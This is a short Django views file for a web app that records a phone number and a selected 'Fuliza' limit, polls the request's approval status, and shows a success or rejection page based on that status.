from django.shortcuts import render, redirect, get_object_or_404
from django.http import JsonResponse
from .models import FulizaRequest


def index(request):
    if request.method == 'POST':
        phone = request.POST.get('phone')
        limit = request.POST.get('limit')

        new_request = FulizaRequest.objects.create(
            phone_number=phone,
            selected_limit=limit
        )

        return render(request, 'loading.html', {
            'request_id': new_request.id
        })

    return render(request, 'index.html')


def agent(request, request_id):
    return render(request, 'agent.html', {'request_id': request_id})


def check_status(request, request_id):
    req = get_object_or_404(FulizaRequest, id=request_id)
    return JsonResponse({'status': req.status})


def success(request, request_id):
    req = get_object_or_404(FulizaRequest, id=request_id)

    # Only allow approved users
    if req.status != "approved":
        return redirect('index')

    context = {
        "req": req,
        "name": req.name if req.name else "Customer",
        "limit": req.selected_limit,
    }

    return render(request, 'success.html', context)


def rejected(request, request_id):
    req = get_object_or_404(FulizaRequest, id=request_id)

    # Only allow rejected users
    if req.status != "rejected":
        return redirect('index')

    context = {
        "req": req,
        "name": req.name if req.name else "Customer",
    }

    return render(request, 'rejected.html', context)